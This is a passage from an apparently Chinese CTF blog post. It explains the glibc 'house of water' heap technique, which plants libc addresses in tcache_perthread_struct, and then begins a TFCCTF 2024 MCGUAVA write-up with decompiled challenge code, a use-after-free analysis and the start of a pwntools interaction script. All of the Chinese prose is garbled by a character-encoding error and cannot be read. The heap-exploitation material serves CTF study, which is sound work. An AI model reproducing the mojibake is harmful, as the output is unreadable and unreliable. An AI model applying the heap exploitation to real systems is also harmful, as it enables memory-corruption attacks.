<p>å› ä¸ºåœ¨ç¼–è¯‘é˜¶æ®µæˆ‘ä»¬ä½¿ç”¨äº†â€œ-gâ€å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨gdbåœ¨ä»»æ„è¡Œä¸‹æ–­ç‚¹<code>b + è¡Œå·</code><br>æ¥ä¸‹æ¥å¯¹è¿™æ®µ demo è¿›è¡Œè°ƒè¯•<br>å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 18 è¡Œï¼Œæ­¤æ—¶ç¨‹åºå®Œæˆçš„æ“ä½œå¦‚ä¸‹ï¼š<br>ç”³è¯·äº† 2 ä¸ªå †å—ï¼Œsize åˆ†åˆ«ä¸º 0x3e0 å’Œ 0x3f0ï¼Œç´§æ¥ç€å°†å…¶é‡Šæ”¾æ‰<br>æˆ‘ä»¬æ¥çœ‹çœ‹æ­¤æ—¶çš„ tcache_perthread_struct ç»“æ„ä½“ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªæ¡†æ¡†çš„åœ°æ–¹çš„åœ°å€å°±æ˜¯æˆ‘ä»¬åˆšæ‰é‡Šæ”¾çš„ 2 ä¸ªå †å—åœ°å€ï¼Œè€Œç¬¬ä¸€ä¸ªæ¡†æ¡†åˆ™æ˜¯ size ä¸º 0x3e0 å’Œ 0x3f0 å¯¹åº”çš„ tcache é“¾è¡¨ chunk çš„ä¸ªæ•°ï¼Œç„¶è€Œè¿™ä¸ª heapbase+0x88 è¿™ä¸ª 0x10001 å¯ä»¥ä½œä¸ºæˆ‘ä»¬fake chunk çš„sizeï¼Œå¦‚æœæˆ‘ä»¬å°†è¿™ä¸ªåœ°æ–¹ä½œä¸º fake chunk å¹¶æ”¾å…¥ unsorted binï¼ˆåé¢ç§°è¿™ä¸ª chunk ä¸º fake unsorted chunkï¼‰ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ tcache_perthread_struct ç»“æ„ä½“ä¸Šè¸©ä¸Š libc çš„åœ°å€ã€‚<br>æ¥ä¸‹æ¥å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 0x38 è¡Œï¼Œè¿™æœŸé—´åšçš„éƒ½æ˜¯å †å—ç”³è¯·å·¥ä½œï¼š<br>è¿ç»­ç”³è¯·äº† 7 ä¸ª 0x90 å¤§å°çš„ chunkï¼Œç„¶åäº¤æ›¿ç”³è¯· 0x90 å’Œ 0x20 å¤§å°çš„ chunkã€‚æˆ‘ä»¬æœ€ç»ˆå¸Œæœ›æœ€åç”³è¯·çš„ 3 ä¸ª 0x90 å¤§å°çš„chunk å¯ä»¥è¿›å…¥ unsorted binï¼Œæ‰€ä»¥æ¯ 2 ä¸ª chunk ä¹‹é—´éƒ½ç”³è¯·ä¸€ä¸ªå°å †å—æ¥é˜²æ­¢ä»–ä»¬åˆå¹¶ã€‚è¿™é‡Œå°†è¦è¿›å…¥ unsorted bin çš„ä¸‰ä¸ª chunk åˆ†åˆ«å‘½åä¸ºï¼šunsorted_startã€unsorted_middleã€unsorted_endã€‚å¾ˆå¥½ç†è§£å§ï¼Œå¼€å§‹ã€ä¸­é—´ã€ç»“æŸğŸ˜‹<br>æœ€åè¿˜ç”³è¯·äº†ä¸€ä¸ªç‰¹åˆ«å¤§çš„ chunkï¼Œsize ä¸º 0xf0010ï¼Œåé¢ç´§æ¥ç€ä¸€ä¸ª size ä¸º 0x20 çš„å° chunk<br>æ¥ç€å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 41 è¡Œï¼Œè¿™é‡Œåœ¨æœ€åé‚£ä¸ª size ä¸º 0x20 çš„ chunk çš„ fd ä½ç½®å†™ä¸Š 0x1000ï¼Œåœ¨ bk ä½ç½®å†™ä¸Š 0x20ã€‚</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>è¿™æ ·åšæ˜¯ä¸ºäº†ç»•è¿‡ unsorted binçš„æ£€æµ‹ã€‚æˆ‘ä»¬å›åˆ°æœ€åˆçš„ fake unsorted chunk çš„ä½ç½®ï¼Œå…¶èµ·å§‹åœ°å€ä¸º0x555555559080</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æˆ‘ä»¬éœ€è¦è®©è¿™ä¸ª chunk åœ¨ unsorted bin ä¸­åˆæ³•ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨è®©è¿™æ · fake unsorted chunk åœ¨ç»“æŸçš„æ—¶å€™çš„ä¸‹ä¸ª chunk çš„ prev_size ä¸º 0x10000ï¼Œä¸” size çš„ issue ä½ä¸º 0ï¼ˆå› ä¸º unsorted bin ä¸­çš„å †å—éƒ½æ˜¯å·²ç»é‡Šæ”¾è¿‡çš„æœªä½¿ç”¨çš„ï¼‰<br>æ¥ä¸‹æ¥å°±æ˜¯å¯¹è¿™ä¸ª fake unsorted chunk è¿›è¡Œè£…ä¿®<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 57 è¡Œï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æœŸé—´åšçš„æ“ä½œå°±æ˜¯å°†æœ€å¼€å§‹ç”³è¯·çš„ 7 ä¸ª 0x90 å¤§å°çš„ chunk ç»™é‡Šæ”¾æ‰ï¼ˆå°† size ä¸º 0x90 å¤§å°çš„ tcache é“¾è¡¨ç»™å¡«æ»¡ï¼Œç¡®ä¿åé¢ä¸‰ä¸ª 0x90 å¤§å°çš„å †å—ç»™é‡Šæ”¾åèƒ½å¤Ÿè¿›å…¥åˆ° unsorted binï¼‰ï¼Œç„¶ååœ¨ unsorted_start å’Œ unsorted_end ä¸Šæ–¹åˆ†åˆ«ä¼ªé€ ä¸€ä¸ªå°å †å—ç„¶åé‡Šæ”¾æ‰ï¼Œè¿™é‡Œä¸»è¦è®²è§£ä¸€ä¸‹å †å—çš„ä¼ªé€ <br>å¯¹äº unsorted_start ä¸Šæ–¹å †å—çš„ä¼ªé€ ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ unsorted_start-0x8 çš„åœ°æ–¹å¡«ä¸Š 0x31 æ¥å½“ä½œ fake chunk çš„ size ç„¶åç›´æ¥é‡Šæ”¾ï¼ˆè¿™ä¸ª size æ˜¯æœ‰è®²ç©¶çš„ï¼Œåé¢ä¼šè§£é‡Šåˆ°ï¼‰ï¼Œunstorted_end çš„åšæ³•ä¹Ÿç±»ä¼¼ï¼Œä¸è¿‡ fake chunk çš„å¤§å°ä¸º 0x20ã€‚åœ¨å°† fake chunk ç»™é‡Šæ”¾åç”±äºå †å—è¿›å…¥ tcache é“¾è¡¨å fd+8 çš„åœ°æ–¹ä¼šå¡«ä¸Šä¸€ä¸ª keyï¼Œè¿™ä¸ª key çš„ä½œç”¨æ˜¯ç”¨æ¥æ£€æµ‹ tcache ä¸Šæ˜¯å¦å‡ºç° double freeï¼Œè¿™ä¸ª key çš„å­˜åœ¨ç ´åäº†åŸå…ˆ unsorted_start å’Œ unsorted_end è¿™ 2 ä¸ªå †å—çš„ size ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»™äºˆæ¢å¤ï¼Œç¬¬ 50 å’Œ ç¬¬ 56 è¡Œçš„ä»£ç çš„ä½œç”¨å°±æ˜¯å¦‚æ­¤ã€‚<br>é‚£ä¹ˆä¼ªé€  2 ä¸ª fake chunk ç„¶å é‡Šæ”¾æ‰æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ<br>æˆ‘ä»¬å›åˆ°å‰é¢ï¼Œå‰é¢è¯´è¿‡æ¥ä¸‹æ¥çš„æ“ä½œæ˜¯ä¸ºäº†å¯¹è¦è¿›å…¥ unsorted bin çš„  fake unsorted chunk è¿›è¡Œè£…ä¿®ï¼Œè€Œ unsorted bin æ˜¯å­˜åœ¨ fd å’Œ bk æŒ‡é’ˆçš„ï¼Œæ­¤æ—¶å†æ¥çœ‹çœ‹æˆ‘ä»¬çš„ fake unsorted chunk</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å¯ä»¥çœ‹åˆ° fake chunk çš„ fd å’Œ bk å·²ç»ç•™ä¸‹æˆ‘ä»¬å‰é¢ 2 ä¸ªé‡Šæ”¾çš„ fake chunk çš„ data åŒºåŸŸåœ°å€ï¼ŒåŒæ—¶è¿™ä¸ª 2 åœ°å€<br>ä¹Ÿåˆ†åˆ«æ˜¯ unsorted_end å’Œ unsorted_start è¿™ 2 ä¸ªå †å—çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸º 0x555555559090 è¿™ä¸ªåœ°å€ä¸º tcache_perthread_struct ç»“æ„ä½“ entries é“¾è¡¨çš„èµ·å§‹åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯æœ€åè¿›å…¥ 0x20 å¤§å°çš„ tcache é“¾è¡¨çš„å †å—çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬æœ€åé‡Šæ”¾çš„ 2 ä¸ª fake chunk å¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30ã€‚<br>æˆ‘ä»¬å°†æ–­ç‚¹ä¸‹åˆ°ç¬¬ 63 è¡Œï¼ŒæœŸé—´è¿›è¡Œçš„æ“ä½œä¸ºï¼šä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_startã€‚bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„æ“ä½œæ˜¯è¦è®©æˆ‘ä»¬ä¸€å¼€å§‹åœ¨ tcache_perthread_struct ä¸­ä¼ªé€ çš„å †å—é“¾å…¥ unsorted binï¼Œè¿™é‡Œçš„æ“ä½œæ˜¯å°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚å›åˆ°æˆ‘ä»¬ fake chunk çš„é‚£å¼ å›¾ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° fake chunk çš„fd æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_endï¼Œbk æŒ‡é’ˆå·²ç»æŒ‡å‘ unsorted_startï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯ä»¤ unsorted_start çš„ fd æŒ‡é’ˆæŒ‡å‘ fake unsorted chunkï¼Œunsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk å³å¯å®Œæˆ unsorted bin ä¸Šå †å—æ›¿æ¢æ“ä½œ<br>å°†æ–­ç‚¹ä¸‹åœ¨ç¬¬ 67 è¡Œï¼ŒæœŸé—´çš„æ“ä½œå°±æ˜¯è¿›è¡Œä¸Šè¿°çš„æŒ‡é’ˆæ›¿æ¢æ“ä½œï¼Œæœ€åçš„ bin ç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå°† unsorted_middle ç»™æ›¿æ¢ä¸º fake chunkã€‚<br>æ¥ä¸‹æ¥å°±æ˜¯è¦è®© fake unsorted chunk çš„ fd æŒ‡é’ˆå’Œ bk æŒ‡é’ˆå‡ºç° libc çš„åœ°å€ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ª chunk çš„size å°äº 0x10000 ä¸”æ— å¯¹åº” size çš„ chunk åœ¨tcache å’Œå…¶ä»– bin ä¸­æ—¶ï¼Œä¼šå…ˆå¯¹ unsroted bin è¿›è¡Œéå†ï¼Œç„¶å unsorted_end å’Œ unsorted_start é€å…¥ smallbin ä¸­ï¼Œå°† fake chunk é€å…¥ largebin ä¸­ï¼Œæ­¤æ—¶ fake chunk çš„ fd å’Œ bk æŒ‡é’ˆæŒ‡å‘ libc çš„ç›¸å…³åœ°å€ï¼Œæ­¤æ—¶å†åœ¨ fake unsorted chunk ä¸­åˆ‡å‰²å‡ºåˆé€‚å¤§å°çš„å †å—è¿›è¡Œåˆ†é…ã€‚how2heap çš„ä»£ç ä¸­é€‰æ‹©ç”³è¯·çš„å †å—å¤§å°ä¸º 0x290ï¼Œå…¶å®ç”³è¯·çš„å¤§å°æ»¡è¶³æˆ‘ä¸Šé¢æ‰€è¯´çš„æ¡ä»¶å³å¯ã€‚<br>å°†æ–­ç‚¹ä¸‹åˆ° 70 è¡Œï¼Œæ­¤æ—¶å·²ç»å®Œæˆäº†å †å—çš„ç”³è¯·ï¼ŒæŸ¥çœ‹ tcache_perthread_struct ç»“æ„ä½“å’Œ bin çš„ç»“æ„ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å·²ç»ç»™è¸©ä¸Š libc ä¸Šçš„åœ°å€â¬†ï¸</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡Œ libc ä¸Šå†…å­˜çš„åˆ†é…ï¼Œè¿™ä¹Ÿæ˜¯ house of water çš„æ‰€æœ‰å†…å®¹ï¼Œåç»­çš„æ”»å‡»å°±çœ‹æ¯ä¸ªäººçš„éœ€æ±‚äº†ã€‚</p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å¯ä»¥çœ‹åˆ° house of water èƒ½å¤Ÿåœ¨æ²¡æœ‰å†…å­˜æ³„éœ²çš„æƒ…å†µä¸‹åœ¨ tcache é“¾ä¸Šç•™ä¸‹ libc çš„ç›¸å…³åœ°å€ã€‚åœ¨ä¿®æ”¹ unsorted_start å’Œ unsroted_end çš„æŒ‡é’ˆä½¿ fake unsorted chunk é“¾å…¥unosorted chunk çš„è¿™æ­¥ä¸­æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€æ­¥å°çˆ†ç ´ï¼Œå› ä¸ºæˆ‘ä»¬æ¯æ¬¡ä¿®æ”¹ä¸èƒ½åªè¦†ç›–åœ°å€çš„ä½3ä½ï¼Œè€Œæ˜¯ä½4ä½ï¼Œåœ¨å¼€å¯äº† alsr çš„ç¯å¢ƒä¸‹ä»ç¬¬ 4 ä½å¼€å§‹çš„åœ°å€éƒ½æ˜¯éšæœºçš„ã€‚<br>æˆ‘è®¤ä¸º house of water æ”»å‡»çš„å…³é”®æ˜¯ä¼ªé€ å¹¶é‡Šæ”¾é‚£ 2 ä¸ªå¤§å°åˆ†åˆ«ä¸º 0x20 å’Œ 0x30 çš„å †å—ï¼Œæƒ³äº†æƒ³è¿™ä¸ªä¼ªé€ åœ¨ pwn é¢˜ä¸­å¹¶ä¸ç®€å•ã€‚<br>å¸Œæœ›è¯»è€…èƒ½å¤Ÿè‡ªå·±è°ƒè¯•ä¸€é how2heap é‡Œé¢çš„ä»£ç ï¼Œç›¸ä¿¡ä½ ä»¬ä¸€å®šä¼šæœ‰æ–°çš„æ”¶è·ã€‚</p>
<h2 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h2><p>è¿™é“é¢˜ç›®éœ€è¦ç”¨åˆ° house of waterï¼Œå½“æ—¶å¥½åƒæœ‰ 7 è§£äº†ï¼Œå¯æ˜¯æˆ‘è¿˜æ²¡åšå‡ºæ¥ï¼Œå¤ªèœäº†ğŸ˜­ğŸ˜­ğŸ˜­</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å½“æ—¶çš„æƒ³æ³•æ˜¯è®©åŒä¸€ä¸ª chunk åŒæ—¶è¿›å…¥ unsortedbin å’Œ smallbin ä»¥æ­¤æ¥ç•™ä¸‹ libc çš„åœ°å€ï¼Œå¯æ˜¯æäº†åŠå¤©ä»€ä¹ˆéƒ½æ²¡æå‡ºæ¥ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰å¸ˆå‚…æ˜¯ç”¨è¿™ç§æ–¹æ³•åšå‡ºæ¥çš„ğŸ¤”<br>é¢˜ç›®å¯ä»¥ä» r3kapig æˆ˜é˜Ÿçš„æ¯”èµ›é¢˜åº“ä¸­æ‰¾åˆ°ï¼š<a target="_blank" rel="noopener" href="https://r3kapig-not1on.notion.site/TFC-CTF-2024-Jeopardy-bc81d99eb2064c8db48faf5bc5af50ee">TFC CTF 2024(Jeopardy) (notion.site)</a><br>è¿™é¢˜é™„ä»¶é‡Œç»™çš„ dockerfile é‡Œå†™çš„è¿œç¨‹ç¯å¢ƒä¸º ubuntu:24.10ï¼Œæˆ‘å¯»æ€ç€è¿™ä¸ä¹Ÿæ‰ 8 æœˆå˜›ï¼Œæ€ä¹ˆéƒ½æœ‰ 10 äº†ğŸ¤”<br>è¿™é‡Œæˆ‘åšäº†ä¸ªå°å·æ‡’ï¼Œlibc æˆ‘ç”¨äº†æœ¬åœ°çš„ 2.35ï¼Œä¸è¿‡å¤§å·®ä¸å·®ï¼Œæœ€ç»ˆæ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±ä¸€ä¸ªåç§»ä¸åŒè€Œå·²<br>ç”±äºé¢˜ç›®ä»£ç é‡æ¯”è¾ƒå°‘ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸Šæ¥</p>
<h4 id="idaä¼ªä»£ç "><a href="#idaä¼ªä»£ç " class="headerlink" title="idaä¼ªä»£ç "></a>idaä¼ªä»£ç </h4><p>mainï¼š  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    guava_gius[i] = <span class="number">0LL</span>;</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      guava();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      gius();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>guavaï¼š  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">guava</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( cnt_guavas &gt; <span class="number">255</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how many guavas: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1791</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavset: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v2 - <span class="number">2</span> &lt;= v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guavas: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4[v3], v2 - v3);</span><br><span class="line">  v0 = cnt_guavas++;</span><br><span class="line">  guava_gius[v0] = v4;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>giusï¼š  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gius</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;guava no: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0x100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guava overload&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span> *)guava_gius[v1]);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„èœå•ç¨‹åºï¼Œå®ç°äº†å †å—çš„ç”³è¯·å’Œé‡Šæ”¾åŠŸèƒ½ï¼Œæ²¡æœ‰ç¼–è¾‘å’Œå’Œæ‰“å°åŠŸèƒ½ã€‚æ¼æ´ååˆ†çš„æ˜æ˜¾ï¼Œå°±æ˜¯ gius åœ¨é‡Šæ”¾å †å—åå¹¶æ²¡æœ‰å°†ç›¸åº”çš„æŒ‡é’ˆç½® 0ï¼Œè¿™é‡Œå­˜åœ¨ UAF æ¼æ´ã€‚ç¨‹åºæœ€å¤šå¯ä»¥ç”³è¯· 0x100 ä¸ªå †å—ï¼Œæ¯ä¸ªå †å—æœ€å¤§ä¸º 0x1791ï¼Œè¿™ä¸æ‘†æ˜ç€è®©æˆ‘ä»¬ä½¿ç”¨ house of water è¿›è¡Œæ”»å‡»å˜›ï¼ŸğŸ˜‡<br>è¿™é‡Œå…ˆè´´ä¸Šæˆ‘çš„äº¤äº’è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;*&gt;&#x27;</span>,timeout = <span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index=<span class="number">0</span>,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;how many guavas:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavset:&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;guavas:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span 